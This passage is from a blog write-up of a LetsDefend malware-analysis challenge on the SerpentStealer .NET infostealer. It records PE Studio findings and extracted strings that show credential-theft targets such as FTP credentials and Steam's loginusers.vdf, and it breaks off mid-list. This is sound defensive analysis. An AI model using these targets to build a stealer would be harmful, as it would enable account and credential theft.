<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="A brief analysis on the SerpentStealer malware provided by LetsDefend's medium difficulty challenge.">
<title>Let&#39;s Defend: Serpent Stealer</title>

<link rel='canonical' href='/post/lets-defend-serpent-stealer/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Let's Defend: Serpent Stealer">
<meta property='og:description' content="A brief analysis on the SerpentStealer malware provided by LetsDefend's medium difficulty challenge.">
<meta property='og:url' content='/post/lets-defend-serpent-stealer/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Malware' /><meta property='article:tag' content='Infostealer' /><meta property='article:tag' content='dotnet' /><meta property='article:tag' content='dnSpy' /><meta property='article:published_time' content='2025-02-24T22:41:21-06:00'/><meta property='article:modified_time' content='2025-02-24T22:41:21-06:00'/><meta property='og:image' content='/post/lets-defend-serpent-stealer/ldef.png' />
<meta name="twitter:title" content="Let's Defend: Serpent Stealer">
<meta name="twitter:description" content="A brief analysis on the SerpentStealer malware provided by LetsDefend's medium difficulty challenge."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='/post/lets-defend-serpent-stealer/ldef.png' />
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_f26bce75556ad0f0.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/spencerja'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://app.hackthebox.com/profile/1202496'
                        target="_blank"
                        title="HackTheBox"
                        rel="me"
                    >
                        
                        
                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
    <g>
        <path
            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
        </path>
    </g>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://ctftime.org/team/217710'
                        target="_blank"
                        title="Team"
                        rel="me"
                    >
                        
                        
                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
    preserveAspectRatio="xMidYMid meet">
    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
    </g>
</svg>

                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://tryhackme.com/p/spencerj'
                        target="_blank"
                        title="TryHackMe"
                        rel="me"
                    >
                        
                        
                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
</svg>

                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ul>
    <li><a href="#description">Description</a></li>
    <li><a href="#investigation">Investigation</a></li>
    <li><a href="#answers">Answers</a>
      <ul>
        <li><a href="#1-what-is-the-md5-hash-for-the-malware">1. What is the md5 hash for the malware?</a></li>
        <li><a href="#2-what-is-the-name-of-the-list-the-malware-uses-to-evade-detection-by-the-virustotal-check">2. What is the name of the list the malware uses to evade detection by the VirusTotal check?</a></li>
        <li><a href="#3-what-is-the-name-of-the-folder-that-was-used-by-the-malware-to-collect-the-password-on-it">3. What is the name of the folder that was used by the malware to collect the password on it?</a></li>
        <li><a href="#4-what-is-the-first-command-that-the-malware-uses-to-bypass-the-user-account-control-uac">4. What is the first command that the malware uses to bypass the User Account Control (UAC)?</a></li>
        <li><a href="#5-how-many-file-extensions-does-the-malware-target">5. How many file extensions does the malware target?</a></li>
        <li><a href="#6-what-is-the-first-process-listed-in-the-blacklisted-processes-used-by-the-malware">6. What is the first process listed in the blacklisted processes used by the malware?</a></li>
        <li><a href="#7-what-is-the-last-wallet-name-that-is-targeted-by-the-malware-on-the-list">7. What is the last wallet name that is targeted by the malware on the list?</a></li>
        <li><a href="#8-after-getting-the-current-user-what-is-the-subkey-used-by-the-malware-to-dump-ftp-credentials">8. After getting the current user, what is the subkey used by the malware to dump FTP credentials?</a></li>
      </ul>
    </li>
    <li><a href="#impact">Impact</a></li>
  </ul>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/post/lets-defend-serpent-stealer/">
                <img src="/post/lets-defend-serpent-stealer/ldef_hu_7e946d5b129393ab.png"
                        srcset="/post/lets-defend-serpent-stealer/ldef_hu_7e946d5b129393ab.png 800w, /post/lets-defend-serpent-stealer/ldef_hu_b52b20b68cfc0bf1.png 1600w"
                        width="800" 
                        height="200" 
                        loading="lazy"
                        alt="Featured image of post Let&#39;s Defend: Serpent Stealer" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/letsdefend/" >
                LetsDefend
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/post/lets-defend-serpent-stealer/">Let&#39;s Defend: Serpent Stealer</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            A brief analysis on the SerpentStealer malware provided by LetsDefend&#39;s medium difficulty challenge.
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Feb 24, 2025</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="description">Description
</h2><blockquote>
<p>Located in the heart of the financial district, a leading multinational company was hit by a sophisticated data theft. Over several months, confidential customer data, proprietary software, and sensitive financial information were stolen. The company&rsquo;s cybersecurity team recently discovered that a &ldquo;stealer&rdquo; malware was responsible for the breach. They are analyzing the stealer and trying to protect the company from future attacks.</p></blockquote>
<h2 id="investigation">Investigation
</h2><p>Checking with PE Studio, there are interesting timestamps placed far in the future.</p>
<p><img src="/post/lets-defend-serpent-stealer/images/timestamp.png"
	width="712"
	height="517"
	srcset="/post/lets-defend-serpent-stealer/images/timestamp_hu_4bd8899438c7ff4.png 480w, /post/lets-defend-serpent-stealer/images/timestamp_hu_42d0e5aa23747d01.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="137"
		data-flex-basis="330px"
	
></p>
<p>Also note the debug path, <code>C:\Users\Aperx\SerpentStealer\Serpent\obj\Release\net7.0\win-x86\linked\Serpent.pdb</code> indicates that this is a .NET assembly.</p>
<p>Interestingly, this file is described as a DLL with a massive amount of imports and a whopping 0 exports, also very strange.</p>
<p><img src="/post/lets-defend-serpent-stealer/images/noexports.png"
	width="292"
	height="165"
	srcset="/post/lets-defend-serpent-stealer/images/noexports_hu_83f9305f7ce16521.png 480w, /post/lets-defend-serpent-stealer/images/noexports_hu_fe435ebd2a972df7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="424px"
	
></p>
<p>Investigating Strings shows a ton of suspicious content within this. A few examples.</p>
<ul>
<li>An error &ldquo;Stealing FTP&rdquo;, and steam based API addresses:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Credentials  
</span></span><span class="line"><span class="cl">Error Stealing FTP. (Target may NOT have FTP).  
</span></span><span class="line"><span class="cl">[-] Target does not have FTP.  
</span></span><span class="line"><span class="cl">440D7F4D810EF9298D25EDDF37C1F902  
</span></span><span class="line"><span class="cl">[+] Running steam  
</span></span><span class="line"><span class="cl">C:\Program Files (x86)\Steam  
</span></span><span class="line"><span class="cl">config  
</span></span><span class="line"><span class="cl">loginusers.vdf  
</span></span><span class="line"><span class="cl">7656[0-9]{13}  
